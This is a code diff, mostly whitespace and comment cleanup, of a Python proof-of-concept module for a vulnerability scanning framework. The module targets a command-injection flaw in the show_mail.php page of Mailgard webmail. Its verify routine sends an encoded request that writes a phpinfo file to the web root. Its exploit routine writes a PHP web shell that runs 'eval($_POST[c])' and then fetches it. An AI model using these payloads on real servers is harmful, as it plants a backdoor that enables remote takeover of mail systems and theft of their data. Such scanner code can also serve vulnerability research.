@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Mailgard_0012_L' # 平台漏洞编号，留空
+    vuln_id = 'Mailgard_0012_L'  # 平台漏洞编号，留空
     name = '佑友mailgard webmail邮件系统getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-08'  # 漏洞公布时间
     desc = '''
         show_mail.php: 参数未过滤导致命令执行。
@@ -31,17 +32,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #首先注册用户，登录用户。
-            #获取cookies
+
+            # 首先注册用户，登录用户。
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
-            #aaaa: & echo '<?php phpinfo()?>' > /var/www/newmail/ccc.php&delMove=move&toBoxName=yyy
+            '''
+            # aaaa: & echo '<?php phpinfo()?>' > /var/www/newmail/ccc.php&delMove=move&toBoxName=yyy
             payload = "/src/show_mail.php?sd=aaaa%253A%2520%2526%2520echo%2520%2527%253C%253Fphp%2520phpinfo%2528%2529%253F%253E%2527%2520%253E%2520%252fvar%252fwww%252fnewmail%252fccc.php&delMove=move&toBoxName=yyy"
             requests.get(self.target + payload, cookies=cookies)
             verify_url = self.target + '/ccc.php'
@@ -58,17 +59,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #首先注册用户，登录用户。
-            #获取cookies
+
+            # 首先注册用户，登录用户。
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
-            #echo '<?php phpinfo();eval($_POST[c])?>'
+            '''
+            # echo '<?php phpinfo();eval($_POST[c])?>'
             payload = "/src/show_mail.php?sd=aaaa%253A%2520%2526%2520echo%2520%2527%253C%253Fphp%2520phpinfo%2528%2529%253Beval(%2524_POST%255Bc%255D)%253F%253E%2527%2520%253E%2520%252fvar%252fwww%252fnewmail%252fccc.php&delMove=move&toBoxName=yyy"
             requests.get(self.target + payload, cookies=cookies)
             verify_url = self.target + '/ccc.php'
@@ -80,6 +81,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
